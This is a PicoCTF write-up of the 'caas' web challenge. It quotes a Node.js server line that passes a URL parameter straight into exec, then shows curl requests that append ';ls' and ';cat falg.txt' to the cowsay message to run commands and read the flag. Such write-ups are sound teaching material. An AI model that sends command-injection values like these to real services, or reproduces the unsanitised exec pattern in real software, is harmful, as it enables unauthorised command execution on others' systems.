<font size = '4'>
<p align = 'center'>
<b>
PicoCTF - caas Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Introduction: </b>
This writeup explains the process of solving the "caas" challenge in PicoCTF. The CAAS (Container as a Service) challenge involves exploiting a web application that provides a service using containers. The goal is to identify vulnerabilities in the application and leverage them to obtain the flag.

<b>Author:</b> Misha Jain

<b>Date:</b> November 14, 2023

<b>Tools Used:</b><br>
- Terminal
- Web Browser (Firefox)

<b>Challenge Description:</b><br>
CAAS is a web exploitation challenge that revolves around exploiting vulnerabilities in a web application utilizing container services. The challenge is to find and exploit the weaknesses in the application to retrieve the flag.

<b>Exploitation:</b><br>
1. Visit the provided URL for the CAAS challenge and explore the functionality of the web application.<br>

<p align = 'center'>

![](<Pictures/Caas - Exploring_Domain.png>)

</p><br>

2. Use the curl command in the terminal to visit the provided URL.

<p align = 'center'>curl https://caas.mars.picoctf.net/cowsay/{message};</p><br>

<p align = 'center'>

![](<Pictures/Caas - Exploring_Domain_Terminal.png>)

</p><br>

- curl:<br> The curl command is a powerful and versatile tool for making HTTP requests from the command line.<br><br>

3. On inspecting the javascript code 'index.js', we see that the following command is used.<p align = 'center'>exec(`/usr/games/cowsay ${req.params.message}`)</p><br> The vulnerability in this code lies in the fact that it directly uses user input (req.params.message) to construct a command that is executed with 'exec'. For example, we can pass the following command using the terminal.<br>

<p align = 'center'>curl "https://caas.mars.picoctf.net/cowsay/{message};ls";</p><br>

<p align = 'center'>

![](<Pictures/Caas - Exploiting_Command.png>)

</p><br>

This prints all the files in the directory "/usr/games/cowsay".

4. By using the following command, we can effectively exploit this vulnerability to print the required flag.<br>

<p align = 'center'>curl "https://caas.mars.picoctf.net/cowsay/{message};cat%20falg.txt";</p><br>

<p align = 'center'>

![](<Pictures/Caas - Flag.png>)

</p><br>

<b>Conclusion:</b><br>
The CAAS challenge provides a hands-on experience in exploiting web vulnerabilities within a containerized environment. It's an excellent opportunity to learn about the security implications of using container services.

</font>